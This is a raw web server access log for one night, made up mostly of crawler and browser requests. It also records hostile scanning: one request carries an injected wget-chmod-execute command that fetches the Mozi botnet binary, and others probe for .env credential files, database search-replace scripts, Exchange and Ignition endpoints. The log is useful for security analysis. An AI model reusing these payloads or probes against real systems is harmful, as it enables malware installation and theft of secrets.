51.222.253.20 - - [12/Mar/2022:00:07:44 +0000] "GET / HTTP/1.1" 500 6979 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
120.52.152.20 - - [12/Mar/2022:00:13:19 +0000] "GET /lib/twentytwenty/jquery.twentytwenty.js HTTP/1.1" 200 10967 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
120.52.152.20 - - [12/Mar/2022:00:13:20 +0000] "GET /js/main.js HTTP/1.1" 200 8501 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
120.52.152.19 - - [12/Mar/2022:00:13:17 +0000] "GET /lib/tempusdominus/js/moment.min.js HTTP/1.1" 200 332631 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
120.52.152.19 - - [12/Mar/2022:00:13:23 +0000] "GET /lib/tempusdominus/js/tempusdominus-bootstrap-4.min.js HTTP/1.1" 200 62499 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
120.52.152.19 - - [12/Mar/2022:00:13:25 +0000] "GET /lib/twentytwenty/jquery.twentytwenty.js HTTP/1.1" 200 10967 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
120.52.152.19 - - [12/Mar/2022:00:13:27 +0000] "GET /js/main.js HTTP/1.1" 200 8517 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
45.146.165.37 - - [12/Mar/2022:00:14:41 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 500 6896 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
137.184.209.8 - - [12/Mar/2022:00:30:56 +0000] "GET / HTTP/1.1" 301 556 "-" "python-requests/2.27.1"
137.184.209.8 - - [12/Mar/2022:00:30:57 +0000] "GET / HTTP/1.1" 500 6979 "-" "python-requests/2.27.1"
114.119.130.178 - - [12/Mar/2022:00:32:07 +0000] "GET /courses/sectiondetails?id=4 HTTP/1.1" 500 6904 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
207.46.13.94 - - [12/Mar/2022:00:39:37 +0000] "GET / HTTP/1.1" 500 5319 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
45.77.239.190 - - [12/Mar/2022:00:45:05 +0000] "GET /.env HTTP/1.1" 404 492 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.77.239.190 - - [12/Mar/2022:00:45:06 +0000] "POST / HTTP/1.1" 200 3477 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
66.249.65.16 - - [12/Mar/2022:00:54:48 +0000] "GET / HTTP/1.1" 200 12711 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.16 - - [12/Mar/2022:00:55:44 +0000] "GET /assets/website/js/moment.min.js HTTP/1.1" 200 17486 "https://arkdes.in/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
222.140.134.81 - - [12/Mar/2022:01:04:51 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 483 "-" "-"
45.146.165.37 - - [12/Mar/2022:01:08:31 +0000] "POST /mifs/.;/services/LogService HTTP/1.1" 400 6489 "https://64.227.168.78:443" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
66.249.65.16 - - [12/Mar/2022:01:09:48 +0000] "GET / HTTP/1.1" 500 7311 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.46.13.235 - - [12/Mar/2022:01:20:32 +0000] "GET /robots.txt HTTP/1.1" 301 576 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.235 - - [12/Mar/2022:01:20:32 +0000] "GET /robots.txt HTTP/1.1" 404 5830 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.60 - - [12/Mar/2022:01:20:38 +0000] "GET / HTTP/1.1" 301 556 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
193.118.53.202 - - [12/Mar/2022:01:27:50 +0000] "GET / HTTP/1.1" 200 3421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
130.211.54.158 - - [12/Mar/2022:01:30:06 +0000] "GET / HTTP/1.1" 200 3477 "-" "python-requests/2.27.1"
185.165.171.175 - - [12/Mar/2022:01:54:40 +0000] "GET /Search-Replace-DB-master-ohiu/ HTTP/1.1" 301 560 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.165.171.175 - - [12/Mar/2022:01:54:43 +0000] "GET /Search-Replace-DB-master-ohiu/ HTTP/1.1" 404 5880 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
146.59.233.33 - - [12/Mar/2022:01:54:51 +0000] "GET /SRDB/ HTTP/1.1" 301 510 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:54:53 +0000] "GET /SRDB/ HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:54:54 +0000] "GET /srdb/ HTTP/1.1" 301 510 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:54:56 +0000] "GET /srdb/ HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:54:57 +0000] "GET /rdb/ HTTP/1.1" 301 508 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:54:58 +0000] "GET /rdb/ HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:00 +0000] "GET /SR/ HTTP/1.1" 301 506 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:02 +0000] "GET /SR/ HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:06 +0000] "GET /sr/ HTTP/1.1" 301 506 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:07 +0000] "GET /sr/ HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:09 +0000] "GET /replace/ HTTP/1.1" 301 516 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:10 +0000] "GET /replace/ HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:12 +0000] "GET /search/ HTTP/1.1" 301 514 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:13 +0000] "GET /search/ HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:15 +0000] "GET /find-replace/ HTTP/1.1" 301 526 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:16 +0000] "GET /find-replace/ HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:18 +0000] "GET /find-replace.php HTTP/1.1" 301 532 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:20 +0000] "GET /find-replace.php HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:21 +0000] "GET /search-replace/ HTTP/1.1" 301 530 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:23 +0000] "GET /search-replace/ HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:24 +0000] "GET /sr.php HTTP/1.1" 301 512 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:26 +0000] "GET /sr.php HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:27 +0000] "GET /srdb.php HTTP/1.1" 301 516 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:30 +0000] "GET /srdb.php HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:36 +0000] "GET /replacedb.php HTTP/1.1" 301 526 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:37 +0000] "GET /replacedb.php HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:39 +0000] "GET /searchreplacewp/ HTTP/1.1" 301 532 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:41 +0000] "GET /searchreplacewp/ HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:42 +0000] "GET /replaceliveurl.php HTTP/1.1" 301 536 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:43 +0000] "GET /replaceliveurl.php HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:45 +0000] "GET /replaceurl.php HTTP/1.1" 301 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:47 +0000] "GET /replaceurl.php HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:48 +0000] "GET /replacelive.php HTTP/1.1" 301 530 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:50 +0000] "GET /replacelive.php HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:52 +0000] "GET /SearchReplaceWp/ HTTP/1.1" 301 532 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:53 +0000] "GET /SearchReplaceWp/ HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:55 +0000] "GET /search-replace-db/ HTTP/1.1" 301 536 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:56 +0000] "GET /search-replace-db/ HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:58 +0000] "GET /Search-Replace-DB/ HTTP/1.1" 301 536 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:55:59 +0000] "GET /Search-Replace-DB/ HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:56:03 +0000] "GET /search-replace-db.php HTTP/1.1" 301 542 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
185.220.101.22 - - [12/Mar/2022:01:56:04 +0000] "GET /search-replace-db.php HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
109.70.100.30 - - [12/Mar/2022:01:56:09 +0000] "GET /findreplacedb.php HTTP/1.1" 301 534 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
109.70.100.30 - - [12/Mar/2022:01:56:12 +0000] "GET /findreplacedb.php HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
109.70.100.30 - - [12/Mar/2022:01:56:16 +0000] "GET /sr-db.php HTTP/1.1" 301 518 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
109.70.100.30 - - [12/Mar/2022:01:56:17 +0000] "GET /sr-db.php HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
109.70.100.30 - - [12/Mar/2022:01:56:19 +0000] "GET /sr-db/ HTTP/1.1" 301 512 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
109.70.100.30 - - [12/Mar/2022:01:56:20 +0000] "GET /sr-db/ HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
109.70.100.30 - - [12/Mar/2022:01:56:22 +0000] "GET /searchreplacewp.php HTTP/1.1" 301 538 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
109.70.100.30 - - [12/Mar/2022:01:56:23 +0000] "GET /searchreplacewp.php HTTP/1.1" 404 1453 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0"
45.146.165.37 - - [12/Mar/2022:02:01:54 +0000] "GET /console/ HTTP/1.1" 404 6483 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
207.46.13.94 - - [12/Mar/2022:02:33:07 +0000] "GET / HTTP/1.1" 200 5319 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
114.119.133.165 - - [12/Mar/2022:02:43:02 +0000] "GET /robots.txt HTTP/1.1" 301 588 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.133.165 - - [12/Mar/2022:02:43:05 +0000] "GET /robots.txt HTTP/1.1" 404 5669 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
45.146.165.37 - - [12/Mar/2022:02:48:09 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 6483 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.37 - - [12/Mar/2022:02:56:05 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 6483 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.103.118 - - [12/Mar/2022:03:01:23 +0000] "GET / HTTP/1.0" 400 619 "-" "-"
109.237.103.118 - - [12/Mar/2022:03:01:24 +0000] "GET /.env HTTP/1.1" 404 6520 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
24.72.139.114 - - [12/Mar/2022:03:10:24 +0000] "GET / HTTP/1.1" 200 11173 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
207.46.13.94 - - [12/Mar/2022:03:24:20 +0000] "GET /coursessc.php HTTP/1.1" 200 11562 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
192.241.225.64 - - [12/Mar/2022:03:34:49 +0000] "GET /owa/auth/logon.aspx HTTP/1.1" 404 5876 "-" "Mozilla/5.0 zgrab/0.x"
192.241.224.37 - - [12/Mar/2022:03:35:13 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 5876 "-" "Mozilla/5.0 zgrab/0.x"
54.36.148.167 - - [12/Mar/2022:03:36:50 +0000] "GET /robots.txt HTTP/1.1" 301 520 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.167 - - [12/Mar/2022:03:36:51 +0000] "GET /robots.txt HTTP/1.1" 404 5693 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.26 - - [12/Mar/2022:03:36:52 +0000] "GET / HTTP/1.1" 301 500 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
128.199.92.15 - - [12/Mar/2022:03:37:38 +0000] "GET / HTTP/1.1" 301 556 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
192.241.226.56 - - [12/Mar/2022:03:37:49 +0000] "GET /owa/auth/x.js HTTP/1.1" 404 5876 "-" "Mozilla/5.0 zgrab/0.x"
45.146.165.37 - - [12/Mar/2022:03:39:19 +0000] "GET / HTTP/1.1" 200 12654 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
66.249.65.20 - - [12/Mar/2022:03:42:46 +0000] "GET / HTTP/1.1" 200 12711 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.16 - - [12/Mar/2022:03:43:56 +0000] "GET /assets/website/js/moment.min.js HTTP/1.1" 200 22678 "https://arkdes.in/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/98.0.4758.102 Safari/537.36"
1.38.148.164 - - [12/Mar/2022:03:44:46 +0000] "GET / HTTP/1.1" 200 12728 "-" "Mozilla/5.0 (Linux; Android 11; vivo 2018) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36"
1.38.148.164 - - [12/Mar/2022:03:44:54 +0000] "GET / HTTP/1.1" 500 2304 "-" "Mozilla/5.0 (Linux; Android 11; vivo 2018) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36"
1.38.148.164 - - [12/Mar/2022:03:44:49 +0000] "GET / HTTP/1.1" 500 6947 "-" "Mozilla/5.0 (Linux; Android 11; vivo 2018) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36"
1.38.148.164 - - [12/Mar/2022:03:45:05 +0000] "GET / HTTP/1.1" 200 14536 "-" "Mozilla/5.0 (Linux; Android 11; vivo 2018) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36"
1.38.148.164 - - [12/Mar/2022:03:45:05 +0000] "GET /lib/owlcarousel/assets/owl.carousel.min.css HTTP/1.1" 200 6508 "-" "Mozilla/5.0 (Linux; Android 11; vivo 2018) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36"
1.38.148.164 - - [12/Mar/2022:03:45:05 +0000] "GET /lib/animate/animate.min.css HTTP/1.1" 200 8264 "-" "Mozilla/5.0 (Linux; Android 11; vivo 2018) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36"
1.38.148.164 - - [12/Mar/2022:03:45:05 +0000] "GET /lib/tempusdominus/css/tempusdominus-bootstrap-4.min.css HTTP/1.1" 200 7201 "-" "Mozilla/5.0 (Linux; Android 11; vivo 2018) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36"
1.38.148.164 - - [12/Mar/2022:03:45:05 +0000] "GET /lib/twentytwenty/twentytwenty.css HTTP/1.1" 200 1426 "-" "Mozilla/5.0 (Linux; Android 11; vivo 2018) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36"
1.38.148.164 - - [12/Mar/2022:03:45:05 +0000] "GET /css/style.css HTTP/1.1" 200 3139 "-" "Mozilla/5.0 (Linux; Android 11; vivo 2018) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36"
1.38.148.164 - - [12/Mar/2022:03:45:05 +0000] "GET /css/bootstrap.min.css HTTP/1.1" 200 24341 "-" "Mozilla/5.0 (Linux; Android 11; vivo 2018) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36"
